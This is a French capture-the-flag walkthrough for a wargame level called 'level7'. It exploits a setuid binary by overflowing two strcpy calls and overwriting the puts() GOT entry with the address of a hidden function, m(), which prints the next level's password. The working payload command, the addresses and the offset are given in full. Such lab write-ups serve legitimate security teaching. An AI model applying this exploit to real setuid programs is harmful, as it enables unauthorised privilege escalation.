## Comportement
- J'ai des droits `level7` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*`
- En exécutant le binaire (`./level7`), on observe:
  ```shell
    ./level7 
    Segmentation fault (core dumped)
    ./level7 111
    Segmentation fault (core dumped)
    ./level7 111 222
    ~~
    ./level7 111 222 333
    ~~
  ```


## Analyse
- le password est inscrit dans une variable globale qui est afficher avec un `printf()` qui est situe dans une foncton qui n'est jamais appelee. 
- Utilisation de 2 `strcpy()` qui pourrait nous permettre d'overflow l'appel a la fonction `puts()` juste en dessous avec un call a la fonction `m()` qui nous interesse. 


## Résolution
- On trouve l'adresse de `puts()` => `0x08049928`
  ```shell
    (gdb) disas puts
    ...
    0x08048400 <+0>:	jmp    *0x8049928
  ```
- On trouve l'adresse de `m()` => `0x080484f4`
  ```shell
    (gdb) info function m
    ...
    0x080484f4  m
    ...
    (gdb)
  ```
- On trouve l'offset avec le pattern generator a la difference cette fois ci que ce n'est pas l'`eip` qui est overwritten mais `eax` et `edx`. L'offset est de 20.
- On craft notre payload:
  - argv[1] = "a" * 20 + "puts addr"
  - argv[2] -> puts GOT addr = "m addr"
  ```shell
    ./level7 $(python -c 'print "B" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
  ```
- On obtient directement le password. Il nous reste plus qu'a passer au level8 (`su level8`) en renseignant ce password.
